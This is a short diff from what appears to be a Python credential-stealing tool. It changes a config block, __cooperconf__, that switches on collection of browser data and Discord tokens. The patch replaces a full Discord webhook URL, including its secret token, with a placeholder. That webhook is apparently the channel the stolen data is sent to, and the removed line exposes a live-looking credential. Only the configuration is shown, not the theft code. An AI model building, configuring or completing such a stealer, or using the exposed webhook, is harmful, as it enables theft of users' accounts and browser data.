@@ -34,7 +34,7 @@ def main():
                 print(f'Error in {func.__name__}: {e}')
                 
 __cooperconf__ = {
-    'webhook' : "https://discord.com/api/webhooks/1162555030658875523/sOxWFcrZcTu7No-_C_4saHb3XsCdazBo-7u8bpk4kyoowuoqmmYBqX6NoPcDavTCKU8j",
+    'webhook' : "webhookhere",
     'browsers' : True, 
     'discordtoken' : True,
 }
